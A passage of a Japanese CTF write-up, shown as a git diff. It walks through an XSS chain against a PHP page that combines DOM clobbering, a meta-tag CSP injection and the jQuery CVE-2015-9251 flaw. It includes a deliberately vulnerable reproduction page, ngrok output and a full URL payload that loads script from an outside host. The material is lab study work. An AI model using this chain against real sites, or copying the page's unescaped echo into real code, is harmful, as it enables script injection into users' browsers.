@@ -682,9 +682,104 @@ jQuery before 3.0.0 is vulnerable to Cross-site Scripting (XSS) attacks when a c
 ```
 したがって、ハッシュ以降に`#http://evli.com/evil.js`みたいな感じでアクセスさせられればXSSできそう！  
 したがって、`if(user.name == "admin")`の条件に入る必要がある！  
+以下のようにDOM clobberingを使えば、`user.name`に`admin`が入る！  
+```html
+<meta property="og:title" content name="admin" id="user">
+```
+しかし、`<script src="/api/getuser">`によって`user = {"id":"-1", "name": "guest", "type": "guest"}`が返るので上書きされてしまう！  
+ここで、metaタグ内でCSPを定義してこの`/api/getuser`が読み込まれないように設定する！  
+```txt
+<meta property="og:title" content="script-src 'unsafe-inline' 'unsafe-eval' https://code.jquery.com;" http-equiv="Content-Security-Policy" >
+```
+したがって、`alert(1)`が書かれたalert.jsをngrokを使って外部からアクセスできるようにして、`#http://e7b7a03e9977.ngrok.io/alert.js`みたいにしてアクセスすれば`alert(1)`が呼び出し元のオリジンで実行できる！  
+なお、`/etc/nginx/mime.types`の8行目を以下のように変更してCVE-2015-9251が発動できるようにしておく！  
+```txt
+text/javascript                       js;
+```
 
 - **概要**   
+検証するためにDockerで似たような環境を再現した。  
+https://github.com/mochizukikotaro/docker-nginx-phpfpm/blob/master/docker-compose.yml   
+を参考にした。  
+**midnight.php**  
+php-fpmコンテナ内の`/var/www/html/`に配置する。  
+```php
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="/static/style.css">
+    <meta property="og:title" content=<?php echo $_GET["input"] ?>>
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+    <script src="/getuser.js"></script>
+<script>
+
+if(user.name == "admin"){
+  $.get(location.hash.slice(1));
+}else{
+  document.write("u are not admin, fak off");
+}
+ 
+</script></head>
+
+
+<body>
+<?php echo htmlspecialchars($_GET["input"],ENT_QUOTES) ?>
+</body></html>
+```
+**getuser.js**  
+nginxコンテナ内に`/var/www/html`を作成してその中に入れた。  
+```js
+user = {"id":"-1", "name": "guest", "type": "guest"};
+```
+**ngrok**  
+ローカルのDockerで動いている`http://192.168.99.100:8080/`を外部に公開して外部からアクセスできるようにする。  
+```txt
+$ ./ngrok http http://192.168.99.100:8080/
+ngrok by @inconshreveable                                                (Ctrl+C to quit)                                                                                         Session Status                online                                                     Session Expires               6 hours, 21 minutes                                        Version                       2.3.35                                                     Region                        United States (us)                                         Web Interface                 http://127.0.0.1:4040                                      Forwarding                    http://e7b7a03e9977.ngrok.io -> http://192.168.99.100:8080/Forwarding                    https://e7b7a03e9977.ngrok.io -> http://192.168.99.100:8080                                                                                         Connections                   ttl     opn     rt1     rt5     p50     p90                                              3       0       0.00    0.00    65.65   104.06   
+```
+  
+DOM clobberingについては、以下のような挙動をしており、`name`でないと`"admin"`が格納されていなかった…理由はよくわからん  
+```txt
+// これならDOM clobberingが成功してuser.nameに"admin"が入った！(Chrome上でも)
+<meta property="og:title" content="" name="admin" id="user">
+user.name
+admin
+
+// user.valueに"admin"が入らなかった…
+<meta property="og:title" content value="admin" id="user">
+user.value
+undefined
+user.name
+""
+
+// file.valueに"admin"が入るのかと思ったけどそうはなっていなかった…
+<meta property="og:title" content value="admin" id="file">
+file.value
+undefined
+
+// user.name1に"admin"が入らなかった…
+<meta property="og:title" content name1="admin" id="user">
+user.name
+""
+user.name1
+undefined
+
+// file.nameに"admin"が入ってる！どうやら ???.nameに任意の値を代入できるだけっぽい？
+<meta property="og:title" content name="admin" id="file">
+file.name
+"admin"
+
+// <a id=fileIntegrity><a id=fileIntegrity name=value href=x>を入れようとしたらBugPocみたいな感じでうまく行かなかった…
+fileIntegrity.value
+<a id=fileIntegrity name=value href=x>...</a>  // xが値として入っていない！
+
+```
 - **Payload**   
+```txt
+http://e7b7a03e9977.ngrok.io/midnight.php?input=%22script-src%20%27unsafe-inline%27%20%27unsafe-eval%27%20https://code.jquery.com;%22%20http-equiv=%22Content-Security-Policy%22%20name=%22admin%22%20id=%22user%22%3E%3C!--#http://e7b7a03e9977.ngrok.io/alert.js
+```
+![image](https://user-images.githubusercontent.com/56021519/103630620-46ae3a00-4f85-11eb-89ac-be806a414b93.png)  
+
 ## 
 - **entrypoint**   
 - **概要**   
